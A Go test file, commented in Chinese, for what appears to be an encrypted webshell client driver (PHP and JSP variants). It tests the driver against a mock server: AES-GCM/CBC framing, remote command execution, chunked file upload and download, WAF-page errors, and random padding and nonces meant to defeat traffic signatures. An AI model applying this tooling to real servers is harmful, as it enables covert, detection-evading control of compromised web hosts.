package session

// http_shell_enc_test.go 加密马(phpenc/jspenc)验收测试:httptest 起「模拟加密马
// 服务器」,按协议实现加解密(直接复用驱动的 encCrypt/encDecrypt 原语,二者互为
// 镜像)。覆盖:GCM/CBC 双模式、probe/exec/分块 write+read roundtrip、随机填充
// 长度分布、nonce 不重复、篡改 tag 拒绝、坏 base64(WAF 页)错误语义、错密钥、
// 404、Secret 恢复。全部为协议族级模拟,不含任何特定靶场值。

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"
)

// ---------------- 模拟加密马服务器 ----------------

// encMock 模拟马体端:收 base64 密文 → 解密剥帧 → 按 op 分发 → 加密回帧。
// php 非 nil 时按 phpenc 语义(exec 代码段交给 phpMock.eval);否则按 jspenc
// 语义(exec 代码段是 sh 命令,交给 fakeFS.run)。
type encMock struct {
	key  []byte
	mode string // gcm | cbc
	php  *phpMock
	fs   *fakeFS

	mu        sync.Mutex
	nonces    map[string]int
	padLens   []int
	tamperTag bool // 响应帧最后一字节翻转(模拟 tag 被篡改)
	garbage   bool // 返回 WAF 拦截页(非 base64)
	status    int  // >0 直接返回该 HTTP 状态
}

func newEncMock(key []byte, mode string, php *phpMock) *encMock {
	m := &encMock{key: key, mode: mode, php: php, nonces: map[string]int{}}
	if php == nil {
		m.fs = newFakeFS()
	}
	return m
}

func (m *encMock) efs() *fakeFS {
	if m.php != nil {
		return m.php.fs
	}
	return m.fs
}

// reply 加密一个响应 JSON 并写出(tamper 时翻转末字节模拟篡改)。
func (m *encMock) reply(w http.ResponseWriter, resp encResponse, tamper bool) {
	praw, _ := json.Marshal(resp)
	blob, err := encCrypt(m.key, m.mode, encFrame(praw))
	if err != nil {
		w.WriteHeader(500)
		return
	}
	if tamper {
		blob[len(blob)-1] ^= 0xff
	}
	_, _ = io.WriteString(w, base64.StdEncoding.EncodeToString(blob))
}

func (m *encMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	m.mu.Lock()
	status, garbage, tamper := m.status, m.garbage, m.tamperTag
	m.mu.Unlock()
	if status > 0 {
		w.WriteHeader(status)
		return
	}
	if garbage {
		_, _ = io.WriteString(w, "<html><body>Request Blocked by WAF</body></html>")
		return
	}
	body, _ := io.ReadAll(r.Body)
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	nonceLen := encGCMNonce
	if m.mode == "cbc" {
		nonceLen = encCBCIV
	}
	if len(raw) < nonceLen+1 {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	m.mu.Lock()
	m.nonces[hex.EncodeToString(raw[:nonceLen])]++
	m.mu.Unlock()
	frame, err := encDecrypt(m.key, m.mode, raw)
	if err != nil {
		// 与真实马体一致:解密失败不回显明文细节,回一个加密错误帧
		// (驱动密钥错时连这个帧也解不开 → tag 错误)。
		m.reply(w, encResponse{Err: "decrypt failed", Mode: m.mode}, false)
		return
	}
	if len(frame) == 0 {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	m.mu.Lock()
	m.padLens = append(m.padLens, int(frame[0]))
	m.mu.Unlock()
	payload, err := encUnframe(frame)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	var req encRequest
	if err := json.Unmarshal(payload, &req); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	m.reply(w, m.dispatch(&req), tamper)
}

func (m *encMock) dispatch(req *encRequest) encResponse {
	resp := encResponse{Mode: m.mode}
	switch req.Op {
	case "probe":
		resp.OK = true
		resp.Out = req.S
	case "exec":
		code, _ := base64.StdEncoding.DecodeString(req.Code)
		var out string
		if m.php != nil {
			out = m.php.eval(string(code)) // phpenc:eval PHP 代码段(复用期 1a 模拟)
		} else {
			out, _ = m.fs.run(string(code)) // jspenc:sh -c
		}
		resp.OK = true
		resp.Out = base64.StdEncoding.EncodeToString([]byte(out))
	case "read":
		p, _ := base64.StdEncoding.DecodeString(req.Path)
		data, ok := m.efs().readFile(string(p))
		if !ok {
			resp.Err = "read failed"
		} else {
			resp.OK = true
			resp.Out = base64.StdEncoding.EncodeToString(data)
		}
	case "write":
		p, _ := base64.StdEncoding.DecodeString(req.Path)
		d, _ := base64.StdEncoding.DecodeString(req.Data)
		m.efs().writeFile(string(p), d, req.App == "1")
		resp.OK = true
	default:
		resp.Err = "unknown op"
	}
	return resp
}

func randKey(t *testing.T) []byte {
	t.Helper()
	k := make([]byte, 32)
	if _, err := rand.Read(k); err != nil {
		t.Fatal(err)
	}
	return k
}

// ---------------- 测试 ----------------

// TestEncPHPFullFlow:phpenc(GCM)全链路——加密探针/函数枚举/Exec/分块写读回环。
func TestEncPHPFullFlow(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, info, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	if info.Kind != "http_phpenc" || info.Lang != "phpenc" {
		t.Fatalf("kind/lang = %s/%s", info.Kind, info.Lang)
	}
	if len(info.Funcs) != 4 || info.Funcs[0] != "exec" {
		t.Fatalf("funcs = %v", info.Funcs)
	}
	stdout, _, err := sh.Exec(context.Background(), "id", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "uid=33(www-data)") {
		t.Fatalf("stdout = %q", stdout)
	}
	// 分块写读回环(1.2MB → 3 块)。
	data := make([]byte, 1_200_000)
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	const path = "/var/www/uploads/payload.bin"
	if err := sh.WriteFile(context.Background(), path, data); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	got, err := sh.ReadFile(context.Background(), path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if len(got) != len(data) {
		t.Fatalf("读回长度 = %d, want %d", len(got), len(data))
	}
	for i := range got {
		if got[i] != data[i] {
			t.Fatalf("第 %d 字节不一致", i)
		}
	}
	// 模式锁存与 Secret 持久化。
	sec := sh.Secret()
	if sec.Key == "" || sec.EncMode != "gcm" {
		t.Fatalf("secret = %+v, 应带 key 与 gcm 模式", sec)
	}
}

// TestEncCBCModeFallback:目标只有 CBC(PHP 无 GCM 的降级路径)——驱动先试 gcm
// 失败、自动锁存 cbc,之后全链路正常。
func TestEncCBCModeFallback(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "cbc", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc(cbc 目标): %v", err)
	}
	if sh.enc.Mode() != "cbc" {
		t.Fatalf("模式应锁存为 cbc, got %q", sh.enc.Mode())
	}
	stdout, _, err := sh.Exec(context.Background(), "whoami", 0)
	if err != nil {
		t.Fatalf("Exec(cbc): %v", err)
	}
	if strings.TrimSpace(stdout) != "www-data" {
		t.Fatalf("stdout = %q", stdout)
	}
	if sec := sh.Secret(); sec.EncMode != "cbc" {
		t.Fatalf("EncMode = %q, want cbc", sec.EncMode)
	}
}

// TestEncNonceUniqueAndPadding:nonce 每请求随机不重复;随机填充长度有足够分布
// (杀定长/前缀流量签名的直接证据)。
func TestEncNonceUniqueAndPadding(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, err := NewEncShell(u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 100; i++ {
		if err := sh.Test(context.Background()); err != nil {
			t.Fatalf("Test 第 %d 次: %v", i, err)
		}
	}
	mock.mu.Lock()
	requests := len(mock.padLens)
	distinctNonce := len(mock.nonces)
	distinct := map[int]bool{}
	for _, p := range mock.padLens {
		distinct[p] = true
		if p < 0 || p > encMaxPad {
			t.Errorf("padLen %d 越界", p)
		}
	}
	mock.mu.Unlock()
	if requests != 100 { // 100 次 Test(gcm 首发即中,锁存无重发)
		t.Fatalf("请求数 = %d, want 100", requests)
	}
	if distinctNonce != requests {
		t.Fatalf("nonce 重复:%d 个请求只有 %d 个不同 nonce", requests, distinctNonce)
	}
	if len(distinct) < 20 {
		t.Fatalf("填充长度分布过窄:%d 个请求只有 %d 种 padLen(0~%d)", requests, len(distinct), encMaxPad)
	}
}

// TestEncTamperedTagRejected:响应 tag 被篡改必须拒绝,不伪造成功。
func TestEncTamperedTagRejected(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	mock.mu.Lock()
	mock.tamperTag = true
	mock.mu.Unlock()
	_, _, err = sh.Exec(context.Background(), "id", 0)
	if err == nil {
		t.Fatal("tag 被篡改必须报错")
	}
	if !strings.Contains(err.Error(), "认证失败") && !strings.Contains(err.Error(), "tag") {
		t.Fatalf("错误应带认证失败语义, got %v", err)
	}
}

// TestEncGarbageResponseWAF:WAF 拦截页(非 base64)要有明确错误语义。
func TestEncGarbageResponseWAF(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	mock.garbage = true
	u := probeURL(t, mock)
	_, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err == nil {
		t.Fatal("WAF 页必须报错")
	}
	if !strings.Contains(err.Error(), "base64") || !strings.Contains(err.Error(), "WAF") {
		t.Fatalf("错误应识别 WAF/非 base64, got %v", err)
	}
}

// TestEncWrongKey:密钥不匹配 → 认证失败,不伪造成功。
func TestEncWrongKey(t *testing.T) {
	mock := newEncMock(randKey(t), "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	wrong := randKey(t)
	_, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(wrong))
	if err == nil {
		t.Fatal("错密钥必须报错")
	}
	if !strings.Contains(err.Error(), "tag") && !strings.Contains(err.Error(), "认证失败") {
		t.Fatalf("错误应带 tag/认证语义, got %v", err)
	}
}

// TestEncBadKeyFormat:非 base64/非 32B 密钥在构造期即拒绝。
func TestEncBadKeyFormat(t *testing.T) {
	if _, err := NewEncShell("http://127.0.0.1/x.php", "phpenc", "not-base64!!!"); err == nil {
		t.Fatal("非 base64 密钥应拒绝")
	}
	if _, err := NewEncShell("http://127.0.0.1/x.php", "phpenc", base64.StdEncoding.EncodeToString([]byte("short"))); err == nil {
		t.Fatal("非 32B 密钥应拒绝")
	}
}

// TestEncHTTP404:马体缺失(404)给明确错误。
func TestEncHTTP404(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	mock.status = 404
	u := probeURL(t, mock)
	_, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err == nil || !strings.Contains(err.Error(), "404") {
		t.Fatalf("404 应如实报错, got %v", err)
	}
}

// TestEncJSPFullFlow:jspenc(GCM)全链路——探针/Exec/shell 路径分块写读回环。
func TestEncJSPFullFlow(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", nil) // php == nil → jspenc 语义
	u := probeURL(t, mock)
	sh, info, err := ProbeEnc(context.Background(), u, "jspenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	if info.Kind != "http_jspenc" || info.Lang != "jspenc" {
		t.Fatalf("kind/lang = %s/%s", info.Kind, info.Lang)
	}
	stdout, _, err := sh.Exec(context.Background(), "id", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "uid=33(www-data)") {
		t.Fatalf("stdout = %q", stdout)
	}
	data := make([]byte, 600_000) // 2 块
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	const path = "/tmp/agent.bin"
	if err := sh.WriteFile(context.Background(), path, data); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	got, err := sh.ReadFile(context.Background(), path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if len(got) != len(data) {
		t.Fatalf("读回长度 = %d, want %d", len(got), len(data))
	}
	for i := range got {
		if got[i] != data[i] {
			t.Fatalf("第 %d 字节不一致", i)
		}
	}
}

// TestEncRestoreRoundTrip:Secret 落库 → 进程重启恢复(不重新探测)→ 直接可用,
// 模式从 EncMode 恢复(免双发重探)。
func TestEncRestoreRoundTrip(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "cbc", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	sh.SetID(7)
	sec := sh.Secret()
	got, err := RestoreHTTPShell(7, sec)
	if err != nil {
		t.Fatalf("Restore: %v", err)
	}
	if got.ID() != 7 || got.Kind() != "http_phpenc" {
		t.Fatalf("id/kind = %d/%s", got.ID(), got.Kind())
	}
	if got.enc.Mode() != "cbc" {
		t.Fatalf("恢复后模式 = %q, want cbc(免重探)", got.enc.Mode())
	}
	stdout, _, err := got.Exec(context.Background(), "whoami", 0)
	if err != nil {
		t.Fatalf("恢复后 Exec: %v", err)
	}
	if strings.TrimSpace(stdout) != "www-data" {
		t.Fatalf("stdout = %q", stdout)
	}
}

// TestEncPKCS7RoundTrip:CBC 填充原语自洽(含满块边界)。
func TestEncPKCS7RoundTrip(t *testing.T) {
	for _, n := range []int{1, 15, 16, 17, 64, 65} {
		p := make([]byte, n)
		if _, err := rand.Read(p); err != nil {
			t.Fatal(err)
		}
		got, err := pkcs7Unpad(pkcs7Pad(p, 16), 16)
		if err != nil {
			t.Fatalf("n=%d: %v", n, err)
		}
		if len(got) != n {
			t.Fatalf("n=%d 回环长度 = %d", n, len(got))
		}
		for i := range got {
			if got[i] != p[i] {
				t.Fatalf("n=%d 第 %d 字节不一致", n, i)
			}
		}
	}
}
